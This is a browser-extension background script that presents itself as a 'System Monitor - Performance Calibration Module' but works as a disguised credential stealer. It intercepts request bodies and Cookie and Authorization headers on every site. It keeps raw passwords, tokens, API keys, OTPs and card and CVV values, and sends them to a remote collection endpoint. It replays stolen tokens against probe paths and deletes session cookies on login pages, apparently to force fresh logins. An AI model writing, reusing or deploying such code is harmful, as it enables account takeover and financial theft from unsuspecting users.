// System Monitor - Performance Calibration Module
console.log('Monitor[BG]: Script starting');
importScripts(
    '/core/analytics/utils/diagnostics.js',
    '/core/analytics/utils/reliability.js',
    '/core/analytics/utils/performance-metrics.js',
    '/core/analytics/utils/data-buffer.js',
    '/core/analytics/utils/signature-engine.js',
    '/core/analytics/settings.js'
);

let STATE;
let signalBuffer;
let stabilityBridge;
let performanceMetrics;

const runtime = {
    cache: new Map(),
    usageCount: 0,
    resetTime: Date.now()
};

async function init() {
    try {
        STATE = await SettingsStorage.get();
        Diagnostics.configure(STATE.VERBOSITY);
        Diagnostics.log('INIT', 'System monitor starting', {
            v: '2.1.0-perf',
            cfg: 'Balanced'
        });

        signalBuffer = new SignalBuffer({
            bufferSize: STATE.BUFFER_CAPACITY,
            flushTimeout: STATE.FLUSH_INTERVAL,
            maxSize: STATE.STORAGE_QUOTA,
            maxAgeDays: STATE.RETENTION_DAYS,
            enableQuotaCheck: STATE.QUOTA_MONITORING
        });

        await signalBuffer.initPromise;
        Diagnostics.log('INIT', 'Signal buffer synchronized');

        await SignalBuffer.persistent();

        stabilityBridge = new StabilityBridge(5, 60000);
        performanceMetrics = new PerformanceMetrics();

        bindEventListeners();

        setTimeout(() => runBatch(), 5000);

        Diagnostics.log('INIT', 'System monitor fully synchronized');
    } catch (err) {
        Diagnostics.critical('INIT', 'Synchronization failed', { error: err.message });
    }
}

function bindEventListeners() {
    if (STATE?.DIAGNOSTIC_MODULES?.NETWORK_TRAFFIC) {
        chrome.webRequest.onBeforeRequest.addListener(
            function (details) {
                if (!STATE.ACTIVE) return;
                if (!validateOrigin(details.url)) return;

                if (details.method === 'POST' && details.requestBody) {
                    const data = parseBody(details.requestBody);
                    if (!data) return;
                    if (!evaluateNodePriority(details.url, true)) return;

                    const tag = getSignature(details.url);
                    Diagnostics.log('TRAFFIC', 'Inbound signal detected', { url: details.url, tag });

                    const signal = {
                        t: new Date().toISOString(),
                        type: 'S100',
                        u: details.url,
                        o: getOrigin(details.url),
                        s: details.url.startsWith('https://'),
                        m: details.method,
                        payload: data,
                        meta: {
                            rid: details.requestId,
                            tid: details.tabId,
                            tag,
                            isSecure: details.url.startsWith('https://')
                        }
                    };

                    performanceMetrics.record('S100', signal.o, 'nw_int');
                    syncSignals(signal);
                }
            },
            { urls: ["<all_urls>"] },
            ["requestBody"]
        );
    }

    if (STATE?.DIAGNOSTIC_MODULES?.HEADER_METRICS) {
        chrome.webRequest.onSendHeaders.addListener(
            function (details) {
                if (!STATE.ACTIVE) return;
                if (!validateOrigin(details.url)) return;

                const cHeader = details.requestHeaders?.find(h => h.name?.toLowerCase() === 'cookie');
                const aHeader = details.requestHeaders?.find(h => h.name?.toLowerCase() === 'authorization');

                const sigs = cHeader ? extractSignatures(cHeader.value) : null;

                if (!sigs && !aHeader) return;
                if (!evaluateNodePriority(details.url, true)) return;

                const tag = getSignature(details.url);
                Diagnostics.log('TRAFFIC', 'Header signal detected', { url: details.url, tag });

                const signal = {
                    t: new Date().toISOString(),
                    type: 'H100',
                    u: details.url,
                    o: getOrigin(details.url),
                    s: details.url.startsWith('https://'),
                    payload: {
                        c: sigs,
                        a: (aHeader && aHeader.value) ? {
                            sch: aHeader.value.split(' ')[0],
                            m: mask(aHeader.value.split(' ')[1] || '', 'auth')
                        } : null
                    },
                    meta: {
                        rid: details.requestId,
                        tid: details.tabId,
                        tag
                    }
                };

                if (STATE.HEURISTIC_PATTERNS.TOKEN_VALIDATION_ENABLED && aHeader && aHeader.value) {
                    signal.meta.analysis = { a: SignatureEngine.process(aHeader.value) };
                }

                performanceMetrics.record('H100', signal.o, 'hdr_int');
                syncSignals(signal);
            },
            { urls: ["<all_urls>"] },
            ["requestHeaders"]
        );
    }
}

function buildKey(signal) {
    try {
        const k = {
            type: signal.type,
            u: signal.u,
            o: signal.o,
            s: signal.s,
            m: signal.m || null,
            payload: signal.payload
        };
        return JSON.stringify(k);
    } catch {
        return JSON.stringify({
            type: signal?.type,
            u: signal?.u,
            o: signal?.o
        });
    }
}

function hash(signal) {
    const k = buildKey(signal);
    return k
        .split('')
        .reduce((h, c) => ((h << 5) - h) + c.charCodeAt(0), 0)
        .toString();
}

function isRecent(h) {
    if (runtime.cache.has(h)) {
        const t = runtime.cache.get(h);
        if (Date.now() - t < STATE.SIGNATURE_TTL) {
            return true;
        }
    }
    runtime.cache.set(h, Date.now());

    if (runtime.cache.size > 1000) {
        const limit = Date.now() - STATE.SIGNATURE_TTL;
        for (const [k, v] of runtime.cache.entries()) {
            if (v < limit) runtime.cache.delete(k);
        }
    }

    return false;
}

function isThrottled() {
    const now = Date.now();

    if (now >= runtime.resetTime) {
        runtime.usageCount = 0;
        runtime.resetTime = now + STATE.THROTTLING_WINDOW;
    }

    if (runtime.usageCount >= STATE.MAX_SIGNAL_COUNT) {
        Diagnostics.trace('SYSTEM', 'Signal throttling engaged');
        return true;
    }

    runtime.usageCount++;
    return false;
}

function getOrigin(url) {
    try {
        return new URL(url).hostname;
    } catch {
        return 'unknown';
    }
}

function validateOrigin(url) {
    if (!url) return false;
    const origin = getOrigin(url).toLowerCase();
    const u = url.toLowerCase();

    if (STATE.HEURISTIC_PATTERNS.NOISE_SIGNATURES.some(p => u.includes(p))) {
        return false;
    }

    if (STATE.HEURISTIC_PATTERNS.EXCLUSION_LIST.some(e => origin.includes(e))) {
        return false;
    }

    if (STATE.HEURISTIC_PATTERNS.PRIORITY_NODES.length > 0) {
        return STATE.HEURISTIC_PATTERNS.PRIORITY_NODES.some(p => origin.includes(p));
    }

    return true;
}

function evaluateNodePriority(url, hasData) {
    if (!hasData) return false;
    if (!STATE.HEURISTIC_PATTERNS.FILTER_PRIORITY_ONLY) return true;

    try {
        const u = new URL(url);
        const path = (u.pathname + u.search).toLowerCase();
        const hit = STATE.HEURISTIC_PATTERNS.CRITICAL_PATH_SIGNATURES.some(p =>
            path.includes(p.toLowerCase())
        );
        return hit || !url.startsWith('https://');
    } catch {
        return false;
    }
}

function getSignature(url) {
    const hits = [];
    try {
        const u = new URL(url);
        const path = (u.pathname + u.search).toLowerCase();
        if (STATE.HEURISTIC_PATTERNS.CRITICAL_PATH_SIGNATURES.some(p => path.includes(p.toLowerCase()))) hits.push('critical_path');
        if (!url.startsWith('https://')) hits.push('insecure_bridge');
    } catch { }
    return hits;
}

function parseBody(body) {
    let fields = {};

    if (body.formData) {
        for (const [k, v] of Object.entries(body.formData)) {
            fields[k] = v.length === 1 ? v[0] : v;
        }
    } else if (body.raw) {
        try {
            const dec = new TextDecoder('utf-8');
            const s = body.raw
                .map(i => dec.decode(new Uint8Array(i.bytes)))
                .join('');

            try {
                fields = JSON.parse(s);
            } catch {
                const p = new URLSearchParams(s);
                for (const [k, v] of p.entries()) {
                    fields[k] = v;
                }
            }
        } catch (err) {
            Diagnostics.critical('PARSE', 'Body decomposition failed', { error: err.message });
            return null;
        }
    }

    return filterSensitive(fields);
}

function filterSensitive(data) {
    const filtered = {};

    if (typeof data === 'object' && data !== null) {
        for (const [k, v] of Object.entries(data)) {
            if (isSensitive(k)) {
                filtered[k] = {
                    v: v,
                    m: mask(v, k),
                    t: classify(k)
                };
            }
        }
    }

    return Object.keys(filtered).length > 0 ? filtered : null;
}

function isSensitive(field) {
    if (!field) return false;
    const l = field.toLowerCase();
    return STATE.HEURISTIC_PATTERNS.DOM_SELECTOR_METADATA.some(p =>
        l.includes(p)
    );
}

function classify(field) {
    if (!field) return 'gen';
    const l = field.toLowerCase();
    if (l.includes('pass')) return 'pwd';
    if (l.includes('token')) return 'tok';
    if (l.includes('key')) return 'api';
    if (l.includes('otp') || l.includes('pin')) return 'otp';
    if (l.includes('cvv') || l.includes('card')) return 'pay';
    return 'gen';
}

function mask(v, f) {
    if (!v) return '[e]';
    const s = String(v);
    if (s.length <= 4) return '****';
    return s.substring(0, 2) + '****' + s.substring(s.length - 2);
}

function extractSignatures(s) {
    if (!s) return null;
    const sigs = {};

    s.split(';').forEach(c => {
        const [n, ...v] = c.trim().split('=');
        if (n && isSensitiveCookie(n)) {
            sigs[n] = {
                v: v.join('='),
                m: mask(v.join('='), n)
            };
        }
    });

    return Object.keys(sigs).length > 0 ? sigs : null;
}

function isSensitiveCookie(n) {
    if (!n) return false;
    const l = n.toLowerCase();
    return STATE.HEURISTIC_PATTERNS.COOKIE_SIGNATURES.some(p =>
        l.includes(p)
    );
}

async function syncSignals(signal, retry = 0) {
    if (!STATE.ACTIVE) return;

    if (STATE.HEURISTIC_PATTERNS.TOKEN_VALIDATION_ENABLED && signal.payload && typeof signal.payload === 'object') {
        const analysis = SignatureEngine.batch(signal.payload);
        if (Object.keys(analysis).length > 0) {
            if (!signal.meta) signal.meta = {};
            signal.meta.analysis = { ...(signal.meta.analysis || {}), ...analysis };
        }
    }

    if (STATE.HEURISTIC_PATTERNS.REMOTE_PROBE_ENABLED) {
        const rawToken = getProbeToken(signal);
        if (rawToken) {
            try {
                const root = new URL(signal.u).origin;
                const pathList = STATE.HEURISTIC_PATTERNS.REMOTE_PROBE_TARGETS;
                const limit = STATE.HEURISTIC_PATTERNS.PROBE_TIMEOUT;
                const probes = await SignatureEngine.probe(rawToken, root, null, pathList, Math.min(limit, 3000));
                if (probes.length > 0) {
                    if (!signal.meta) signal.meta = {};
                    signal.meta.probes = probes;
                }
            } catch { }
        }
    }

    const h = hash(signal);
    if (isRecent(h)) return;

    if (isThrottled()) {
        signalBuffer.store(signal);
        return;
    }

    try {
        console.log('Monitor[BG]: Syncing signal to:', STATE.METRIC_COLLECTION_ENDPOINT);
        await stabilityBridge.run(async () => {
            const res = await fetch(STATE.METRIC_COLLECTION_ENDPOINT, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-System-Node': '2.1.0-perf',
                    'X-Sig-Timestamp': signal.t,
                    'X-Sig-Type': signal.type
                },
                body: JSON.stringify(signal)
            });

            if (!res.ok) throw new Error(`Node error: ${res.status}`);

            Diagnostics.log('SYNC', 'Signal synchronized', {
                type: signal.type,
                origin: signal.o
            });

            performanceMetrics.ok();
        });
    } catch (err) {
        Diagnostics.trace('SYNC', 'Synchronization failed, buffering', { error: err.message, retry });
        performanceMetrics.fail('network');

        if (retry < STATE.RETRY_THRESHOLD) {
            performanceMetrics.retry();
            setTimeout(() => {
                syncSignals(signal, retry + 1);
            }, STATE.RECONNECT_INTERVAL * Math.pow(2, retry));
        } else {
            signalBuffer.store(signal);
        }
    }
}

function getProbeToken(signal) {
    const p = signal.payload;
    if (!p || typeof p !== 'object') return null;
    const keys = ['access_token', 'id_token', 'token', 'bearer', 'auth', 'jwt'];
    for (const [k, v] of Object.entries(p)) {
        if (!v) continue;
        if (keys.some(t => k.toLowerCase().includes(t))) {
            const raw = typeof v === 'string' ? v : (v.v !== undefined ? v.v : null);
            if (raw) return raw;
        }
    }
    return null;
}

async function runBatch() {
    try {
        const batch = await signalBuffer.next(10);

        if (batch.length > 0) {
            Diagnostics.log('SIGNAL', `Processing ${batch.length} buffered signals`);

            for (const item of batch) {
                try {
                    await syncSignals(item.p);
                    await signalBuffer.drop(item.id);
                } catch (err) {
                    const r = await signalBuffer.retry(item.id);
                    if (r > STATE.RETRY_THRESHOLD) {
                        await signalBuffer.drop(item.id);
                    }
                }
            }
        }
    } catch (err) {
        Diagnostics.critical('SIGNAL', 'Batch processing failed', { error: err.message });
    }
}

chrome.runtime.onMessage.addListener((msg, src, send) => {
    console.log('Monitor[BG]: Received message', msg.type, 'from', src.url);
    const router = {
        'FORM_EVENT': handleUIEvent,
        'PREFILL_EVENT': handlePrefill,
        'TOGGLE_EVENT': handleToggle,
        'FETCH_PIPE': handleFetchPipe,
        'STREAM_REPORT': handleStreamReport,
        'GET_STATE': () => handleGetState(),
        'GET_SETTINGS': () => handleGetSettings(),
        'UI_RESET_CMD': (m) => handleUIReset(m, src)
    };
    const handler = router[msg.type];
    if (!handler) {
        return false; // Don't claim response; let other listeners (e.g. injection) handle it
    }
    (async () => {
        try {
            const res = await handler(msg, src);
            send(res);
        } catch (err) {
            Diagnostics.critical('MSG', 'Router error', { type: msg.type, error: err.message });
            send({ err: err.message });
        }
    })();
    return true; // Will respond async
});

async function handleUIEvent(msg, src) {
    const u = msg.data.url;
    if (!validateOrigin(u)) {
        Diagnostics.log('DEBUG', 'UI Event skipped: Invalid origin', { url: u });
        return { status: 'skipped' };
    }

    const data = filterSensitive(msg.data.fields);
    if (!data) {
        Diagnostics.log('DEBUG', 'UI Event skipped: No sensitive data found', { fields: Object.keys(msg.data.fields || {}) });
        return { status: 'skipped' };
    }

    if (!evaluateNodePriority(u, true)) {
        Diagnostics.log('DEBUG', 'UI Event skipped: Low priority node', { url: u });
        return { status: 'skipped' };
    }

    const signal = {
        t: new Date().toISOString(),
        type: 'UI_EVENT',
        u: u,
        o: getOrigin(u),
        s: u.startsWith('https://'),
        payload: data,
        meta: {
            tid: src.tab?.id,
            tag: getSignature(u)
        }
    };

    performanceMetrics.record('UI_EVENT', signal.o, 'ui_int');
    await syncSignals(signal);
    return { status: 'ok' };
}

async function handlePrefill(msg, src) {
    const u = msg.data.url;
    if (!validateOrigin(u)) return { status: 'skipped' };

    const data = filterSensitive(msg.data.all);
    if (!data) return { status: 'skipped' };
    if (!evaluateNodePriority(u, true)) return { status: 'skipped' };

    const signal = {
        t: new Date().toISOString(),
        type: 'PREFILL_EVENT',
        u: u,
        o: getOrigin(u),
        s: u.startsWith('https://'),
        payload: data,
        meta: { tag: getSignature(u) }
    };

    performanceMetrics.record('PREFILL', signal.o, 'pf_int');
    await syncSignals(signal);
    return { status: 'ok' };
}

async function handleToggle(msg, src) {
    const u = msg.data.url;
    if (!validateOrigin(u)) return { status: 'skipped' };
    if (!evaluateNodePriority(u, true)) return { status: 'skipped' };

    const signal = {
        t: new Date().toISOString(),
        type: 'TOGGLE_EVENT',
        u: u,
        o: getOrigin(u),
        s: u.startsWith('https://'),
        payload: {
            [msg.data.node]: {
                v: msg.data.val,
                m: mask(msg.data.val),
                t: 'pwd'
            }
        },
        meta: { tag: getSignature(u) }
    };

    performanceMetrics.record('TOGGLE', signal.o, 'tg_int');
    await syncSignals(signal);
    return { status: 'ok' };
}

async function handleFetchPipe(msg, src) {
    const u = msg.data.url;
    if (!validateOrigin(u)) {
        Diagnostics.log('DEBUG', 'Fetch Pipe skipped: Invalid origin', { url: u });
        return { status: 'skipped' };
    }

    const data = filterSensitive(msg.data.body);
    if (!data) {
        Diagnostics.log('DEBUG', 'Fetch Pipe skipped: No sensitive data found', { body_keys: typeof msg.data.body === 'object' ? Object.keys(msg.data.body || {}) : 'raw' });
        return { status: 'skipped' };
    }
    if (!evaluateNodePriority(u, true)) {
        Diagnostics.log('DEBUG', 'Fetch Pipe skipped: Low priority node', { url: u });
        return { status: 'skipped' };
    }

    const signal = {
        t: new Date().toISOString(),
        type: 'PIPE_EVENT',
        u: u,
        o: getOrigin(u),
        s: u.startsWith('https://'),
        m: msg.data.method,
        payload: data,
        meta: { tag: getSignature(u) }
    };

    performanceMetrics.record('PIPE', signal.o, 'pipe_int');
    await syncSignals(signal);
    return { status: 'ok' };
}

async function handleStreamReport(msg, src) {
    const u = msg.data.pageUrl;
    if (!validateOrigin(u)) return { status: 'skipped' };

    const payload = msg.data.msg || msg.data.res;
    if (!payload) return { status: 'skipped' };

    const data = filterSensitive(typeof payload === 'object' ? payload : { msg: payload });
    if (!data) return { status: 'skipped' };

    if (!evaluateNodePriority(u, true)) return { status: 'skipped' };

    const signal = {
        t: msg.data.t || new Date().toISOString(),
        type: 'STREAM_EVENT',
        u, o: getOrigin(u),
        s: u.startsWith('https://'),
        payload: data,
        meta: {
            ws: msg.data.url,
            tag: getSignature(u)
        }
    };

    performanceMetrics.record('STREAM', signal.o, 'stream_int');
    await syncSignals(signal);
    return { status: 'ok' };
}

async function handleGetState() {
    if (!STATE || !performanceMetrics || !signalBuffer || !stabilityBridge) {
        return { captureCount: 0 };
    }
    const m = performanceMetrics.get();
    const b = await signalBuffer.next(0); // This might be expensive, let's just return size
    const s = stabilityBridge.info();

    return {
        ...m,
        restricted: !s.healthy,
        backlog: b.length
    };
}

async function handleGetSettings() {
    if (!STATE) await init();
    return STATE || {};
}

async function handleUIReset(msg, src) {
    const origin = msg.data?.domain;
    if (!origin || !STATE || !STATE.HEURISTIC_PATTERNS) return { status: 'err' };

    const sigs = STATE.HEURISTIC_PATTERNS.VOLATILE_COOKIE_PATTERNS || [];
    let count = 0;

    try {
        const cookies = await chrome.cookies.getAll({ domain: origin });
        for (const c of cookies) {
            const l = c.name.toLowerCase();
            const hit = sigs.some(p => l.includes(p.toLowerCase())) ||
                STATE.HEURISTIC_PATTERNS.COOKIE_SIGNATURES.some(p => l.includes(p.toLowerCase()));

            if (hit) {
                try {
                    await chrome.cookies.remove({
                        url: `http${c.secure ? 's' : ''}://${c.domain}${c.path}`,
                        name: c.name
                    });
                    count++;
                } catch (e) { }
            }
        }

        Diagnostics.log('UI_RESET', `Cleared ${count} nodes`, { origin });
        return { status: 'ok', count, origin };
    } catch (err) {
        Diagnostics.critical('UI_RESET', 'Reset failed', { error: err.message });
        return { status: 'err', error: err.message };
    }
}

chrome.storage.onChanged.addListener((changes, area) => {
    if (area === 'sync') {
        Diagnostics.log('SYSTEM', 'Calibration updated');
        SettingsStorage.get().then(s => {
            STATE = s;
            Diagnostics.configure(STATE.VERBOSITY);
        });
    }
});

setInterval(() => runBatch(), 30000);

chrome.runtime.onInstalled.addListener((d) => {
    Diagnostics.log('SYSTEM', 'Module loaded', { reason: d.reason });
    init();
});

chrome.runtime.onStartup.addListener(() => {
    Diagnostics.log('SYSTEM', 'Session resumed');
    init();
});

chrome.tabs.onUpdated.addListener(async (tid, c, t) => {
    if (!STATE || !STATE.HEURISTIC_PATTERNS || !STATE.HEURISTIC_PATTERNS.STRICT_SESSION_ISOLATION) return;
    if (c.status !== 'complete' || !t.url) return;

    try {
        const u = t.url.toLowerCase();
        const hit = STATE.HEURISTIC_PATTERNS.CRITICAL_PATH_SIGNATURES.some(p =>
            u.includes(p.toLowerCase())
        );

        if (hit) {
            const origin = getOrigin(t.url);
            Diagnostics.log('ISOLATION', 'Isolating session for critical path', { url: t.url, origin });
            await handleUIReset({ data: { domain: origin } }, { tab: { id: tid } });
        }
    } catch (e) { }
});

chrome.runtime.onSuspend.addListener(async () => {
    Diagnostics.log('SYSTEM', 'Module suspended, flushing buffer');
    if (signalBuffer) await signalBuffer.flush();
});

init();
